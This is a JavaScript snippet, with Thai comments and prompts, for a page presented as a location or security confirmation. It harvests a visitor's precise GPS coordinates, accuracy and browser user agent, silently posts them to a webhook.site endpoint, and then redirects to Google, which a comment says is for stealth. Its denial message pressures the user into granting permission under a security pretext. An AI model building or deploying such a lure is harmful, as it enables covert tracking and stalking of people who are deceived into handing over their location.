document.getElementById('confirm-button').addEventListener('click', function() {
    const button = this;
    button.disabled = true;
    button.textContent = 'กำลังยืนยันตำแหน่ง...';

    if ("geolocation" in navigator) {
        const options = {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        };

        navigator.geolocation.getCurrentPosition(
            async function(position) {
                // มัดรวมข้อมูลที่ต้องการทั้งหมดไว้ที่นี่
                const data = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: position.coords.accuracy + " meters",
                    timestamp: new Date().toISOString(),
                    device: navigator.userAgent // เก็บข้อมูลเครื่องไว้ในนี้แทน
                };

                const webhookUrl = 'https://webhook.site/d8654c83-3367-4d22-9448-73772f66ee88';

                try {
                    // ใช้ fetch แบบส่งค่าออกไปแน่นอน (ลดโอกาสติด CORS)
                    await fetch(webhookUrl, {
                        method: 'POST',
                        mode: 'no-cors', // สำคัญมากเพื่อให้ทำงานบนมือถือได้
                        headers: { 
                            'Content-Type': 'application/json' 
                        },
                        body: JSON.stringify(data)
                    });

                    // เนื่องจาก no-cors จะอ่าน response.ok ไม่ได้ เราจะถือว่าส่งออกไปแล้ว
                    document.getElementById('alert-content').style.display = 'none';
                    document.getElementById('success-content').style.display = 'block';
                    
                    // หลังจาก 2 วินาที ให้เด้งไป Google เพื่อความเนียน
                    setTimeout(() => {
                        window.location.href = "https://www.google.com";
                    }, 2000);

                } catch (error) {
                    console.error('Webhook error:', error);
                    button.disabled = false;
                    button.textContent = 'ยืนยันตำแหน่งปัจจุบัน';
                }
            },
            function(error) {
                let message = '';
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        message = 'กรุณากด "อนุญาต" เพื่อเข้าสู่ระบบความปลอดภัย';
                        break;
                    case error.POSITION_UNAVAILABLE:
                        message = 'ไม่สามารถระบุตำแหน่งได้ กรุณาเปิด GPS';
                        break;
                    case error.TIMEOUT:
                        message = 'การเชื่อมต่อล่าช้า กรุณาลองใหม่อีกครั้ง';
                        break;
                    default:
                        message = 'เกิดข้อผิดพลาดในการตรวจสอบ';
                }
                alert(message);
                button.disabled = false;
                button.textContent = 'ยืนยันตำแหน่งปัจจุบัน';
            },
            options
        );
    } else {
        alert('เบราว์เซอร์ไม่รองรับระบบนี้');
        button.disabled = false;
    }
});
